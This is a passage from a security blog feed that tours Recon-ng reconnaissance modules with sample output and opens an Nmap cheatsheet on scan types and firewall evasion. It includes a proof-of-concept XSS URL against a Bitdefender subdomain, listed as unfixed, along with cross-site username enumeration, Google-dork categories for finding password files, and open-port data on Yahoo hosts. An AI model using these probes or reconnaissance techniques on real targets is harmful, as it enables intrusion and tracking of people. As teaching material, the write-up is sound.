[</em>] Example: <a href="https://safeweb.norton.com/report/show?url=store.bitdefender.com">https://safeweb.norton.com/report/show?url=store.bitdefender.com</a>
[<em>] Host: store.bitdefender.com
[</em>] Publish_Date: 2016-06-20 21:09:16
[*] Reference: <a href="https://www.openbugbounty.org/incidents/160213/">https://www.openbugbounty.org/incidents/160213/</a></p>

<h2>[*] Status: unfixed</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="https://labs.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert">https://labs.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert</a><code>OPENBUGBOUNTY</code>
[<em>] Host: labs.bitdefender.com
[</em>] Publish_Date: 2016-05-17 20:31:25
[*] Reference: <a href="https://www.openbugbounty.org/incidents/154457/">https://www.openbugbounty.org/incidents/154457/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="https://rdprojects.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert">https://rdprojects.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert</a><code>OPENBUGBOUNTY</code>
[<em>] Host: rdprojects.bitdefender.com
[</em>] Publish_Date: 2016-05-17 20:32:26
[*] Reference: <a href="https://www.openbugbounty.org/incidents/154458/">https://www.openbugbounty.org/incidents/154458/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: REDIRECT
[</em>] Example: <a href="http://www.bitdefender.com/site/Main/tdRedirect/?url=http://xssposed.org/">http://www.bitdefender.com/site/Main/tdRedirect/?url=http://xssposed.org/</a>
[<em>] Host: bitdefender.com
[</em>] Publish_Date: 2016-01-03 01:53:37
[*] Reference: <a href="https://www.openbugbounty.org/incidents/121291/">https://www.openbugbounty.org/incidents/121291/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: REDIRECT
[</em>] Example: <a href="https://store.bitdefender.com/redirect.php?url=http://xssposed.org/">https://store.bitdefender.com/redirect.php?url=http://xssposed.org/</a>
[<em>] Host: store.bitdefender.com
[</em>] Publish_Date: 2015-09-19 20:33:58
[*] Reference: <a href="https://www.openbugbounty.org/incidents/87399/">https://www.openbugbounty.org/incidents/87399/</a></p>

<h2>[*] Status: fixed</h2>

<hr />

<h2>SUMMARY</h2>

<p>[*] 5 total (5 new) vulnerabilities found.
```</p>

<ul>
<li><p>Hosts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames stored in the &lsquo;hosts&rsquo; table</p></li>
<li><p>Bing API IP Neighbor Enumerator &ndash; Leverages the Bing API and &ldquo;ip:&rdquo; advanced search operator to enumerate other virtual hosts sharing
the same IP address. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>FreeGeoIP &ndash; Leverages the freegeoip.net API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
</ul>


<p>I used this to check the location of www.google.com host (resolved the IP first):</p>

<p><code>plain
[recon-ng][default][freegeoip] &gt; run
[*] 172.217.16.100 - 37.4192,-122.0574 - Mountain View, California, United States
</code></p>

<ul>
<li><p>My-IP-Neighbors.com Lookup &ndash; Checks My-IP-Neighbors.com for virtual hosts on the same server. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>IPInfoDB GeoIP &ndash; Leverages the ipinfodb.com API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>Hostname Resolver &ndash; Resolves the IP address for a host. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each IP address to resolve the hostname. Updates the &lsquo;hosts&rsquo; table
with the results.</p></li>
<li><p>Address Geocoder &ndash; Queries the Google Maps API to obtain coordinates for an address. Updates the &lsquo;locations&rsquo; table with
the results.</p></li>
</ul>


<p>Let&rsquo;s see this module in action with one of our favorite tech giants' addresses xD (I leave it to you to see what&rsquo;s located there):</p>

<p>``` plain
[recon-ng][default][geocode] > run
[<em>] Geocoding &lsquo;1600 Amphitheatre Parkway&rsquo;&hellip;
[</em>] Latitude: 37.4224713, Longitude: -122.0843333</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 1 total (1 new) locations found.
```</p>

<ul>
<li>Reverse Geocoder &ndash; Queries the Google Maps API to obtain an address from coordinates.</li>
</ul>


<p>So we have some coordinates. Let&rsquo;s see what&rsquo;s there:</p>

<p>``` plain
[recon-ng][default][reverse_geocode] > run
[<em>] Reverse geocoding (35.670337, 139.702573)&hellip;
[</em>] 1 Chome-18-20 Jingūmae, Shibuya-ku, Tōkyō-to 150-0001, Japan</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 1 total (1 new) locations found.
```</p>

<ul>
<li><p>Flickr Geolocation Search &ndash; Searches Flickr for media in the specified proximity to a location.</p></li>
<li><p>Instagram Geolocation Search &ndash; Searches Instagram for media in the specified proximity to a location.</p></li>
<li><p>Picasa Geolocation Search &ndash; Searches Picasa for media in the specified proximity to a location.</p></li>
<li><p>Shodan Geolocation Search &ndash; Searches Shodan for media in the specified proximity to a location.</p></li>
<li><p>Twitter Geolocation Search &ndash; Searches Twitter for media in the specified proximity to a location.</p></li>
<li><p>YouTube Geolocation Search &ndash; Searches YouTube for media in the specified proximity to a location.</p></li>
<li><p>Whois Company Harvester &ndash; Uses the ARIN Whois RWS to harvest Companies data from whois queries for the given netblock. Updates
the &lsquo;companies&rsquo; table with the results.</p></li>
<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each of a netblock&rsquo;s IP addresses to resolve the hostname. Updates the
&lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Shodan Network Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;net&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table
with the results.</p></li>
<li><p>Internet Census 2012 Lookup &ndash; Queries the Internet Census 2012 data through Exfiltrated.com to enumerate open ports for a
netblock.</p></li>
</ul>


<p>This will come in handy to give you an idea about hosts without directly port scanning them:</p>

<p>``` plain
[recon-ng][default][census_2012] > run</p>

<hr />

<h2>8.3.34.0/23</h2>

<p>[<em>] 8.3.34.0/23 (8.3.34.0 &ndash; 8.3.35.255)
[</em>] 8.3.34.5 (rsw4-1-gci.smpenn.corp.yahoo.com) &ndash; 80
[<em>] 8.3.34.28 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.46 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[<em>] 8.3.34.60 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.66 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[<em>] 8.3.34.79 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.222 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[<em>] 8.3.34.225 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 25
[<em>] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.246 (tstsqlclstr1d.smca.yahoo.com) &ndash; 80
[<em>] 8.3.34.255 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.35.71 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 80
[<em>] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 25
[</em>] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 80
[<em>] 8.3.35.186 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 80
[</em>] 8.3.35.220 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 80</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 17 total (17 new) ports found.
````</p>

<ul>
<li><p>Ports to Hosts Data Migrator &ndash; Adds a new host for all the hostnames stored in the &lsquo;ports&rsquo; table.</p></li>
<li><p>Dev Diver Repository Activity Examiner &ndash; Searches public code repositories for information about a given username.</p></li>
</ul>


<p>This is another useful module to search for a developer on different platforms (note to self: I have to get back into coding frenzy):</p>

<p>``` plain
[recon-ng][default][dev_diver] > run
[<em>] Checking Github&hellip;
[</em>] Github username found &ndash; (<a href="https://api.github.com/users/chousensha">https://api.github.com/users/chousensha</a>)</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |                               Github                              |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | Resource    | Github                                              |
  | User Name   | chousensha                                          |
  | Profile URL | <a href="https://github.com/chousensha">https://github.com/chousensha</a>                       |
  | Avatar URL  | <a href="https://avatars.githubusercontent.com/u/5703557?v=3">https://avatars.githubusercontent.com/u/5703557?v=3</a> |
  | Location    |                                                     |
  | Company     |                                                     |
  | Blog URL    | <a href="http://chousensha.github.io/">http://chousensha.github.io/</a>                        |
  | Email       |                                                     |
  | Bio         |                                                     |
  | Followers   | 2                                                   |
  | ID          | 5703557                                             |
  | Joined      | 2013-10-16                                          |
  | Updated     | 2016-04-29                                          |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>

<p>[<em>] Checking Bitbucket&hellip;
[</em>] Bitbucket username not found.
[<em>] Checking SourceForge&hellip;
[</em>] Sourceforge username not found.
[<em>] Checking CodePlex&hellip;
[</em>] CodePlex username not found.
[<em>] Checking Gitorious&hellip;
[</em>] Gitorious username not found.</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 1 total (1 new) contacts found.
```</p>

<ul>
<li><p>Linkedin Contact Crawler &ndash; Harvests contact information from linkedin.com by parsing the link(s) given and adding the info to
the &lsquo;contacts&rsquo; table.</p></li>
<li><p>Linkedin Profile Crawler &ndash; Harvests profiles from linkedin.com by visting the given link(s), crawling the &ldquo;Viewers of this
profile also viewed&rdquo;, parsing the pages, and adding new profiles to the &lsquo;profiles&rsquo; table</p></li>
<li><p>NameChk.com Username Validator &ndash; Leverages NameChk.com to validate the existance of usernames on specific web sites and updates the
&lsquo;profiles&rsquo; table with the results.</p></li>
</ul>


<p>Good for recon but also for checking if how unique is your l33t handle:</p>

<p>``` plain
[recon-ng][default][namechk] > run
[*] Retrieving site data&hellip;</p>

<hr />

<h2>CHOUSENSHA</h2>

<p>[<em>] Wordpress: Available.
[</em>] Reddit: Available.
[<em>] Blogger: Available.
[</em>] GooglePlus: Available.
[<em>] Ebay: Available.
[</em>] Twitch: Available.
[<em>] Instagram: Available.
[</em>] Twitter: User exists!
[<em>] Facebook: User exists!
[</em>] Slack: Available.
[<em>] PayPal: Available.
[</em>] Pinterest: Available.
[<em>] Vine: User exists!
[</em>] Github: User exists!
[<em>] Basecamp: Available.
[</em>] Flickr: Available.
[<em>] Pandora: Available.
[</em>] Spotify: Available.
[<em>] YouTube: User exists!
[</em>] MySpace: Available.
[<em>] Steam: Available.
[</em>] Flipboard: Available.
[<em>] OkCupid: Available.
[</em>] UStream: Available.
[<em>] Vimeo: Available.
[</em>] Etsy: User exists!
[<em>] BitBucket: Available.
[</em>] SoundCloud: Available.
[<em>] 500px: Available.
[</em>] CashMe: Available.
[<em>] Meetup: Available.
[</em>] DailyMotion: Available.
[<em>] About.me: User exists!
[</em>] ProductHunt: Available.
[<em>] Disqus: User exists!
[</em>] Medium: User exists!
[<em>] Behance: Available.
[</em>] Imgur: Available.
[<em>] Bit.ly: User exists!
[</em>] Fanpop: Available.
[<em>] Cafe Mom: Available.
[</em>] Instructables: Available.
[<em>] Photobucket: Available.
[</em>] Good Reads: Available.
[<em>] deviantART: Available.
[</em>] Tumblr: Available.
[<em>] Gravatar: Available.
[</em>] Venmo: User exists!
[<em>] Keybase: Available.
[</em>] StumbleUpon: User exists!
[<em>] Kongregate: User exists!
[</em>] LiveJournal: Available.
[<em>] Yelp: User exists!
[</em>] Codecademy: Available.
[<em>] Foursquare: Available.
[</em>] Team Treehouse: Available.
[<em>] AngelList: Available.
[</em>] Viddler: Available.
[<em>] tsu: Available.
[</em>] last.fm: Available.
[<em>] Technorati: Available.
[</em>] Aviary: User exists!
[<em>] Fotolog: User exists!
[</em>] Slideshare: Available.
[<em>] Blinklist: Available.
[</em>] Tripit: User exists!
[<em>] GogoBot: Available.
[</em>] Flavors.me: Available.
[<em>] BuzzFeed: Available.
[</em>] TripAdvisor: Available.
[<em>] blip.fm: Available.
[</em>] Dribbble: Available.
[<em>] Geeklist: User exists!
[</em>] Papaly: Available.
[<em>] wishlistr: Available.
[</em>] Vk: Available.
[<em>] Pastebin: Available.
[</em>] Coinbase: Available.
[<em>] iFunny: Available.
[</em>] Roblox: User exists!
[<em>] XFire: Available.
[</em>] Witty: User exists!
[<em>] Wikipedia: Available.
[</em>] Hacker<a href="news:">news:</a> User exists!
[<em>] StreamMe: Available.
[</em>] Abouto: Available.
[<em>] qmpeople: Available.
[</em>] Fiverr: Available.
[<em>] Plenty Of Fish: Available.
[</em>] Voat: User exists!
[<em>] Trakt: Available.
[</em>] IFTTT: Available.
[<em>] Crokes: User exists!
[</em>] Tracky: Available.
[<em>] GetSatisfaction: Available.
[</em>] Ello: User exists!</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 24 total (24 new) profiles found.
```</p>

<p>Hmm, quite a few other &ldquo;challengers&rdquo;.</p>

<ul>
<li>OSINT HUMINT Profile Collector &ndash; Takes each username from the profiles table and searches a variety of web sites for those users.</li>
</ul>


<p>This one checks 191 sites for the username, here we go:</p>

<p>``` plain
[recon-ng][default][profiler] > run
[*] Retrieving <a href="https://raw.githubusercontent.com/WebBreacher/WhatsMyName/master/web_accounts_list.json...">https://raw.githubusercontent.com/WebBreacher/WhatsMyName/master/web_accounts_list.json...</a></p>

<p>  Looking Up Data For: Chousensha</p>

<hr />

<p>[<em>] Checking: about.me
[</em>] Checking: AdultFriendFinder
[<em>] Checking: Matchdoctor
[</em>] Checking: AngelList
[<em>] Checking: aNobil
[</em>] Checking: ask.fm
[<em>] Checking: Atlassian
[</em>] Checking: Atlassian Self-Signup
[<em>] Checking: AudioBoom
[</em>] Checking: authorSTREAM
[<em>] Checking: badoo
[</em>] Checking: Bitbucket
[<em>] Checking: BLIP.fm
[</em>] Checking: Black Planet
[<em>] Checking: Blogmarks
[</em>] Checking: Blogspot
[<em>] Checking: BodyBuilding.com
[</em>] Checking: Break
[<em>] Checking: Bugcrowd
[</em>] Checking: cafemom
[<em>] Checking: CarDomain
[</em>] Checking: cHEEZburger
[<em>] Checking: CodePlex
[</em>] Checking: CoderStats
[<em>] Checking: COLOURlovers
[</em>] Checking: Conferize
[<em>] Checking: copytaste
[</em>] Checking: cruiseMates
[<em>] Checking: Dailymotion
[</em>] Checking: Delicious
[<em>] Checking: DeviantArt
[</em>] Checking: diigo
[<em>] Checking: DIY
[</em>] Checking: eBay
[<em>] Checking: EightBit
[</em>] [profile] chousensha &ndash; CoderStats (<a href="http://coderstats.net/github/chousensha/">http://coderstats.net/github/chousensha/</a>)
[<em>] Checking: Engadget
[</em>] Checking: EPORNER
[<em>] Checking: Etsy
[</em>] Checking: facebook.com
[<em>] Checking: families.com
[</em>] Checking: fanpop
[<em>] Checking: FFFFOUND!
[</em>] Checking: Fiverr
[<em>] Checking: Flickr
[</em>] Checking: Foodspotting
[<em>] Checking: Fotolog
[</em>] Checking: Foursquare
[<em>] Checking: freesound
[</em>] Checking: FriendFinder-X
[<em>] Checking: FunnyOrDie
[</em>] Checking: Garmin connect
[<em>] Checking: GeekGrade
[</em>] Checking: Geocaching
[<em>] Checking: GETItON
[</em>] Checking: GitHub
[<em>] Checking: gogobot
[</em>] Checking: goodreads
[<em>] Checking: Gravatar
[</em>] Checking: howaboutwe
[<em>] Checking: HubPages
[</em>] Checking: I-am-pregnant
[<em>] Checking: IFTTT
[</em>] [profile] chousensha &ndash; GitHub (<a href="https://api.github.com/users/chousensha">https://api.github.com/users/chousensha</a>)
[<em>] Checking: ImageShack
[</em>] Checking: imgur
[<em>] Checking: InsaneJournal
[</em>] Checking: Instagram
[<em>] Checking: instructables
[</em>] Checking: Internet Archive
[<em>] Checking: interpals
[</em>] Checking: Keybase
[<em>] Checking: Klear
[</em>] Checking: Klout
[<em>] Checking: Kongregate
[</em>] Checking: Lanyrd
[<em>] Checking: Last.fm
[</em>] Checking: LibraryThing
[<em>] Checking: LinkedIn
[</em>] Checking: LiveJasmin
[<em>] Checking: Marketing Land
[</em>] Checking: mate1
[<em>] [profile] chousensha &ndash; Kongregate (<a href="http://www.kongregate.com/accounts/chousensha">http://www.kongregate.com/accounts/chousensha</a>)
[</em>] Checking: Medium
[<em>] Checking: Meetzur
[</em>] Checking: Microsoft Technet Community
[<em>] Checking: Mixcloud
[</em>] Checking: Mixcrate
[<em>] Checking: Mixlr
[</em>] Checking: Mod DB
[<em>] Checking: Muck Rack
[</em>] [profile] chousensha &ndash; Internet Archive (<a href="http://archive.org/search.php?query=chousensha">http://archive.org/search.php?query=chousensha</a>)
[<em>] Checking: MyBuilder.com
[</em>] Checking: MyFitnessPal
[<em>] Checking: MyLot
[</em>] Checking: Myspace
[<em>] Checking: netvibes
[</em>] Checking: Newsvine
[<em>] Checking: Overcast Network
[</em>] Checking: Photoblog
[<em>] Checking: PhotoBucket
[</em>] Checking: PictureTrail
[<em>] Checking: PinkBike
[</em>] Checking: Pinterest
[<em>] Checking: Playlists.net
[</em>] Checking: Plurk
[<em>] Checking: POF
[</em>] Checking: Porn.com
[<em>] Checking: Pornhub
[</em>] Checking: PSNProfiles
[<em>] Checking: raptr
[</em>] Checking: Readability
[<em>] Checking: Reunion.com
[</em>] Checking: scratch
[<em>] Checking: Security Street
[</em>] Checking: SEOClerks
[<em>] Checking: setlist.fm
[</em>] Checking: Shopcade
[<em>] Checking: singlemuslim
[</em>] Checking: slideshare
[<em>] Checking: SmugMug
[</em>] Checking: smule
[<em>] Checking: snooth
[</em>] Checking: Soup
[<em>] Checking: Speaker Deck
[</em>] Checking: sporcle
[<em>] Checking: Steam
[</em>] Checking: stupidcancer
[<em>] Checking: TF2 Backpack Examiner
[</em>] Checking: theguardian
[<em>] Checking: thesixtyone
[</em>] Checking: tribe
[<em>] Checking: tripadvisor
[</em>] Checking: Tripit
[<em>] Checking: tumblr
[</em>] Checking: Twitter
[<em>] Checking: untappd
[</em>] Checking: uSTREAM
[<em>] Checking: viddler
[</em>] Checking: VideoLike
[<em>] Checking: vidme
[</em>] Checking: Vimeo
[<em>] Checking: Vine
[</em>] Checking: VisualizeUs
[<em>] Checking: Voices.com
[</em>] Checking: Wanelo
[<em>] Checking: wattpad
[</em>] Checking: WeeWorld
[<em>] Checking: wishlistr
[</em>] [profile] chousensha &ndash; VideoLike (<a href="http://videolike.org/video/chousensha">http://videolike.org/video/chousensha</a>)
[<em>] Checking: Wikipedia
[</em>] [profile] chousensha &ndash; Twitter (<a href="https://twitter.com/chousensha">https://twitter.com/chousensha</a>)
[<em>] Checking: WordPress
[</em>] Checking: WordPress Support
[<em>] Checking: Xanga
[</em>] Checking: Xbox Gamertag
[<em>] Checking: xHamster
[</em>] Checking: XVIDEOS
[<em>] Checking: YouTube
[</em>] Checking: Zooppa
[*] [profile] chousensha &ndash; YouTube (<a href="https://www.youtube.com/user/chousensha/videos">https://www.youtube.com/user/chousensha/videos</a>)</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 7 total (5 new) profiles found.
```</p>

<ul>
<li><p>Twitter Handles &ndash; Searches Twitter for users that mentioned, or were mentioned by, the given handle.</p></li>
<li><p>Github Code Enumerator &ndash; Uses the Github API to enumerate repositories and gists owned by a Github user. Updates the
&lsquo;repositories&rsquo; table with the results.</p></li>
<li><p>Github Commit Searcher &ndash; Uses the Github API to gather user profiles from repository commits. Updates the &lsquo;profiles&rsquo; table
with the results.</p></li>
<li><p>Github Gist Searcher &ndash; Uses the Github API to download and search Gists for possible information disclosures. Updates the
&lsquo;vulnerabilities&rsquo; table with the results</p></li>
<li><p>Github Dork Analyzer &ndash; Uses the Github API to search for possible vulnerabilites in source code by leveraging Github Dorks
and the &lsquo;repo&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
<li><p>Indeed Resume Crawl &ndash; Crawls Indeed.com for contacts and resumes. Adds name, title, and location to the contacts table and
a link to the resume in the profiles table. Can only harvest the first 1,000 results. Result set
changes, so running the same crawl mutiple times can produce new contacts. If the PAST_EMPS option
is set to true, the module will crawl both current and past employees. Given a keyword, the module
will only harvest contacts whose resumes contain the keyword. (e.g. Linux Admin)</p></li>
<li><p>Meta Data Extractor &ndash; Searches for files associated with the provided domain(s) and extracts any contact related metadata</p></li>
<li><p>HackerTarget Lookup &ndash; Uses the HackerTarget.com API to find host names. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>ThreatCrowd DNS lookup &ndash; Leverages the ThreatCrowd passive DNS API to discover hosts/subdomains.</p></li>
<li><p>Google Hacking Database &ndash; Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
and the &lsquo;site&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
</ul>


<p>This module is massive! Basically, you get Google dorks inside Recon-ng!</p>

<p>``` plain
[recon-ng][default][ghdb] > show info</p>

<pre><code>  Name: Google Hacking Database
  Path: modules/recon/domains-vulnerabilities/ghdb.py
Author: Tim Tomes (@LaNMaSteR53)
</code></pre>

<p>Description:
  Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
  and the &lsquo;site&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p>

<p>Options:
  Name                                 Current Value  Required  Description</p>

<hr />

<p>  DORKS                                               no        file containing an alternate list of Google dorks
  GHDB_ADVISORIES_AND_VULNERABILITIES  False          yes       enable/disable the 1996 dorks in this category
  GHDB_ERROR_MESSAGES                  False          yes       enable/disable the 93 dorks in this category
  GHDB_FILES_CONTAINING_JUICY_INFO     False          yes       enable/disable the 366 dorks in this category
  GHDB_FILES_CONTAINING_PASSWORDS      False          yes       enable/disable the 199 dorks in this category
  GHDB_FILES_CONTAINING_USERNAMES      False          yes       enable/disable the 17 dorks in this category
  GHDB_FOOTHOLDS                       False          yes       enable/disable the 49 dorks in this category
  GHDB_NETWORK_OR_VULNERABILITY_DATA   False          yes       enable/disable the 63 dorks in this category
  GHDB_PAGES_CONTAINING_LOGIN_PORTALS  False          yes       enable/disable the 372 dorks in this category
  GHDB_SENSITIVE_DIRECTORIES           False          yes       enable/disable the 119 dorks in this category
  GHDB_SENSITIVE_ONLINE_SHOPPING_INFO  False          yes       enable/disable the 11 dorks in this category
  GHDB_VARIOUS_ONLINE_DEVICES          False          yes       enable/disable the 307 dorks in this category
  GHDB_VULNERABLE_FILES                False          yes       enable/disable the 62 dorks in this category
  GHDB_VULNERABLE_SERVERS              False          yes       enable/disable the 83 dorks in this category
  GHDB_WEB_SERVER_DETECTION            False          yes       enable/disable the 77 dorks in this category
  SOURCE                               default        yes       source of input (see &lsquo;show info&rsquo; for details)</p>

<p>Source Options:
  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL
  <string>       string representing a single input
  <path>         path to a file containing a list of inputs
  query <sql>    database query returning one column of inputs</p>

<p>Comments:
  * Special thanks to the Offenvise Security crew for maintaining the GHDB and making it available to
  open source projects like Recon-ng. Thanks Muts!
```</p>

<ul>
<li><p>SSLTools.com Host Name Lookups &ndash; Uses the ssltools.com site to obtain host names from a site&rsquo;s SSL certificate metadata to update the
&lsquo;hosts&rsquo; table.  Security issues with the certificate trust are pushed to the &lsquo;vulnerabilities&rsquo;
table.</p></li>
<li><p>censys.io port lookup by netblock &ndash; Queries censys.io to enumerate open ports for a netblock</p></li>
</ul>


<h2>Reporting</h2>

<ul>
<li><p>CSV File Creator &ndash; Creates a CSV file containing the specified harvested data</p></li>
<li><p>HTML Report Generator &ndash; Creates a HTML report</p></li>
</ul>


<p>I really liked the HTML report format. It classifies data into:</p>

<p><code>plain
domains
companies   
netblocks   
locations   
vulnerabilities
ports   
hosts   
contacts    
credentials
leaks   
pushpins    
profiles    
repositories
</code></p>

<ul>
<li><p>JSON Report Generator &ndash; Creates a JSON report.</p></li>
<li><p>List Creator &ndash; Creates a file containing a list of records from the database</p></li>
<li><p>PushPin Report Generator &ndash; Creates HTML media and map reports for all of the PushPins stored in the database.</p></li>
<li><p>XLSX File Creator &ndash; Creates an Excel compatible XLSX file containing the entire data set</p></li>
<li><p>XML Report Generator -Creates a XML report</p></li>
</ul>


<p>It took a while to list everything! As you could see, the Recon-ng framework is an information gathering tool on steroids! And if you can&rsquo;t find what you need among the current modules, you can write your own and contribute!</p>

<p>Until next time, here&rsquo;s the cookie straight from the cow&rsquo;s mouth:</p>

<p>``` plain</p>

<hr />

<p>/ Q: How did you get into artificial   \
| intelligence? A: Seemed logical &mdash; I |
\ didn&rsquo;t have any real intelligence.   /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nmap cheatsheet]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet/"/>
    <updated>2016-07-31T06:40:43-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet</id>
    <content type="html"><![CDATA[<p>Recently, I&rsquo;ve been reading Fyodor&rsquo;s <a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717">Nmap Network Scanning</a> book and decided to create an Nmap cheatsheet while at it.</p>

<p>Half of the book, including updated content, is also available for free on <a href="https://nmap.org/book/toc.html">https://nmap.org/book/toc.html</a></p>

<p>Fyodor was also nice enough to set up a machine that you can test your scans against (within reasonable limits), at <a href="http://scanme.nmap.org/">http://scanme.nmap.org/</a></p>

<p>All right, let&rsquo;s get scanning!</p>

<!-- more -->


<h1>Commands cheatsheet</h1>

<h2>Scan types</h2>

<p><strong>-sS</strong>: TCP SYN scan &ndash; the default scan, most popular due to its speed and stealth, as it doesn&rsquo;t complete a TCP connection</p>

<p><strong>-sT</strong>: TCP Connect scan, it uses the connect() system call, used by unprivileged users who can&rsquo;t send raw packets or when scanning IPv6 targets</p>

<p><strong>-sV</strong>: Version detection, omit for performance increase and/or stealth</p>

<p><strong>-sA</strong>: TCP ACK scan, can&rsquo;t tell if the ports are open or closed, but it can determine whether firewall rules are stateful or stateless</p>

<p><strong>-sW</strong>: TCP Window scan, same as ACK, but it can determine open and closed ports on certain systems</p>

<p><strong>-sM</strong>: Maimon scan, yet another special scan type for bypassing firewalls</p>

<p><strong>-sU</strong>: UDP scan. You can improve it by adding a version scan alongside it (but it will be slower)</p>

<p><strong>-sF</strong>: FIN scan, sets the FIN bit, useful in bypassing some firewalls and determining the target&rsquo;s OS between Windows and Unix types, as it doesn&rsquo;t work against Windows</p>

<p><strong>-sX</strong>: Xmas scan, another option for firewall evasion, sets the FIN, PSH, and URG flags, creating the impression of a lit Christmas tree</p>

<p><strong>-sN</strong>: Null scan, doesn&rsquo;t set any flags, an additional option to evade pesky firewalls</p>

<p><strong>-sO</strong>: IP protocol scan, check which IP protocols are supported on the target</p>

<p><strong>-b <FTP relay host></strong>: FTP bounce scan, also available to unprivileged users</p>

<p><strong>-A</strong>: Enable OS detection, version detection, script scanning, and traceroute</p>

<h3>Host discovery</h3>

<p><strong>List scan &ndash; sL</strong> &ndash; enumerates the addresses in the specified range and does reverse DNS lookup on them. Good for getting a feel about the targets by checking their DNS names, and maintaining a low profile on the network (because no ping requests are being sent yet, so it&rsquo;s stealthier)</p>

<p><strong>-p-</strong>: Shortcut for <em>-p1-65535</em></p>

<p><strong>-Pn</strong>: Treat all hosts as online &mdash; skip host discovery (disable ping)</p>

<p><strong>&mdash;exclude &lt;host1[,host2][,host3],&hellip;></strong>: Exclude hosts/networks</p>

<p><strong>-n</strong>: Never do DNS resolution</p>

<p><strong>-sP</strong>: perform a ping sweep</p>

<p><strong>-PS/PA/PU</strong>: TCP SYN ping/TCP ACK ping/UDP ping &ndash; various host discovery options for bypassing firewalls</p>

<h3>Performance</h3>

<p><strong>-T&lt;0-5></strong>: Set timing template (higher is faster). -T4 (aggressive) is recommended for most cases, as it improves performance and optimization for a fast and reliable network. For evasion purposes you can use T0 (paranoid) or T1 (sneaky), but speed will be very slow. To conserve bandwidth and resources you may use T2 (polite), at another significant expense of speed. T3 is the normal mode, and T5 is an insane level of speed (but you might sacrifice some accuracy in the process)</p>

<p><strong>-F</strong>: Fast scan, only scan most common 100 ports</p>

<h3>Evasion</h3>

<p><strong>-D &lt;decoy1,decoy2[,ME],&hellip;></strong>: Cloak a scan with decoys</p>

